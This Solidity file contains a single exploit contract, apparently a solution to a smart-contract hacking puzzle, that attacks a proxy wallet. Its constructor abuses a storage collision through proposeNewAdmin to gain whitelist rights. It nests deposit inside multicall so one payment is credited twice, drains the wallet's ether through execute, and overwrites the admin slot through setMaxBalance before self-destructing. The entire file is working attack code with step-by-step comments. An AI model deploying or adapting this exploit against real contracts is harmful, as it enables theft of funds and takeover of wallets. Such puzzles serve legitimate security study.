//SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

//ensuring the functions are callabele via the rekt contract
interface IWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Rekt {
    constructor(IWallet wallet) payable {
        // whitelisting process 
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        // draining the contract
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // initial call to deposit
        data[0] = deposit_data[0];
        // using multicall to call deposit a second time
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
        wallet.multicall{value: 0.001 ether}(data);

        // withdraw all funds that have been put into contract, noting that the balance of the contract is 0.002ETH
        wallet.execute(msg.sender, 0.002 ether, "");

        // given conditions of whitelisting and 0 balance are met, we can become admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        // checks to ensure the above have been successful 
        require(wallet.admin() == msg.sender, "no one has been rekt");
        selfdestruct(payable(msg.sender));
    }
}